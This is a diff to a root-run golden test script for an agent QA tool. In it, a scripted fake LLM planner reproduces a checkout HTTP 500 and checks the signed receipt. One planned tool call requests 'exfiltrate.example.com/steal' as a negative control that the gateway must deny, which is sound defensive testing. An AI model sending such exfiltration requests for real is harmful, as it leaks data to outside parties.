@@ -15,7 +15,7 @@ export PATH="/opt/workflo/venv/bin:$PATH"
 
 if [ "$(id -u)" -ne 0 ]; then echo "must run as root" >&2; exit 1; fi
 
-WORK=/root/wf-planner-golden
+WORK="${WORKFLO_PLANNER_GOLDEN_DIR:-/root/wf-planner-golden}"
 rm -rf "$WORK"; mkdir -p "$WORK"; cd "$WORK"
 
 # --- Fake OpenAI-compatible LLM server (scripted planner) ---
@@ -28,11 +28,15 @@ PORT = int(sys.argv[1])
 plans = [
     {"done": False, "steps": [
         {"tool": "http_get", "args": {"url": "http://app.workflo.internal:3457/"},
-         "reason": "check root responds"},
+         "reason": "check a healthy root control route"},
         {"tool": "http_get", "args": {"url": "http://app.workflo.internal:3457/health"},
-         "reason": "check health endpoint"},
+         "reason": "check a healthy health control route"},
+        {"tool": "http_get", "args": {"url": "http://app.workflo.internal:3457/checkout"},
+         "reason": "probe checkout and record the first server error"},
+        {"tool": "http_get", "args": {"url": "http://app.workflo.internal:3457/checkout"},
+         "reason": "repeat checkout to prove the failure is reproducible"},
         {"tool": "http_get", "args": {"url": "http://exfiltrate.example.com/steal"},
-         "reason": "must be denied by the gateway"},
+         "reason": "negative control: this request must be denied by the ToolGateway"},
     ]},
     {"done": True, "steps": []},
 ]
@@ -102,7 +106,7 @@ workflo config test-llm
 
 echo "==> workflo run --deep-test (LLM planner mode)"
 set +e
-workflo run --path /root/wf-fixture --deep-test --start-command "python3 app.py" --port 3457 --timeout 300 \
+workflo run --path "${WORKFLO_PLANNER_FIXTURE:-/root/wf-fixture}" --deep-test --start-command "python3 app.py" --port 3457 --timeout 300 \
   >run.stdout 2>run.stderr
 RUN_EXIT=$?
 set -e
@@ -117,6 +121,59 @@ if [ -z "$RECEIPT" ]; then
   exit 1
 fi
 
+# This scripted mission intentionally finds a reproducible product defect.
+# The Judge must confirm two identical checkout 500s against healthy controls;
+# a blocked exfiltration attempt remains a separate policy-denial observation.
+python3 - "$RECEIPT" <<'PY'
+import json
+import sys
+
+document = json.load(open(sys.argv[1], encoding="utf-8"))
+receipt = document.get("receipt", document)
+findings = receipt.get("run_report", {}).get("findings", [])
+activity = receipt.get("agent_activity") or {}
+print("Agent activity:", json.dumps({
+    "planner": activity.get("planner"),
+    "tool_calls": activity.get("tool_calls"),
+    "tools_used": activity.get("tools_used"),
+    "steps_total": activity.get("steps_total"),
+    "steps_completed": activity.get("steps_completed"),
+    "steps_failed": activity.get("steps_failed"),
+    "denied_attempts": activity.get("denied_attempts"),
+}, sort_keys=True))
+evidence_dir = __import__("pathlib").Path(sys.argv[1]).parent / "evidence"
+record_files = list(evidence_dir.rglob("agent_tool_calls.jsonl")) if evidence_dir.exists() else []
+for record_file in record_files:
+    records = [json.loads(line) for line in record_file.read_text(encoding="utf-8").splitlines() if line.strip()]
+    print("Agent tool record summary:", json.dumps([
+        {
+            "tool": record.get("tool"),
+            "denied": record.get("denied"),
+            "ok": record.get("ok"),
+            "status": (record.get("result_summary") or {}).get("status"),
+            "error": (record.get("result_summary") or {}).get("error"),
+            "url": (record.get("args") or {}).get("url"),
+        }
+        for record in records
+    ], sort_keys=True))
+confirmed = [
+    finding for finding in findings
+    if finding.get("status") == "confirmed"
+    and finding.get("title") == "GET /checkout fails (HTTP 500)"
+]
+if activity.get("planner") != "llm":
+    print("Expected the LLM planner in the signed receipt; got:", activity, file=sys.stderr)
+    raise SystemExit(1)
+if int(activity.get("tool_calls", 0)) < 5:
+    print("Expected at least five governed tool calls; got:", activity, file=sys.stderr)
+    raise SystemExit(1)
+if not confirmed:
+    print("Expected a confirmed GET /checkout HTTP 500 finding; got:", findings, file=sys.stderr)
+    raise SystemExit(1)
+print("Confirmed reproducible QA finding:", confirmed[0]["title"])
+print("Evidence references:", ", ".join(confirmed[0].get("evidence_refs", [])))
+PY
+
 echo
 echo "==> workflo verify (independent)"
 set +e
@@ -130,8 +187,8 @@ set -e
 cat verify.stderr
 
 echo
-echo "    run exit:    $RUN_EXIT"
+echo "    run exit:    $RUN_EXIT (1 = expected verified finding)"
 echo "    verify exit: $VERIFY_EXIT"
-[ "$RUN_EXIT" -ne 0 ] && { echo "PLANNER GOLDEN FAILED (run)"; exit 1; }
+[ "$RUN_EXIT" -eq 1 ] || { echo "PLANNER GOLDEN FAILED (expected exit code 1 for the confirmed finding)"; exit 1; }
 [ "$VERIFY_EXIT" -ne 0 ] && { echo "PLANNER GOLDEN FAILED (verify)"; exit 1; }
-echo "PLANNER GOLDEN PASSED: LLM planner -> governed agent -> evidence -> signed receipt -> verified"
+echo "PLANNER GOLDEN PASSED: planner -> governed agent -> confirmed QA finding -> signed receipt -> verified"
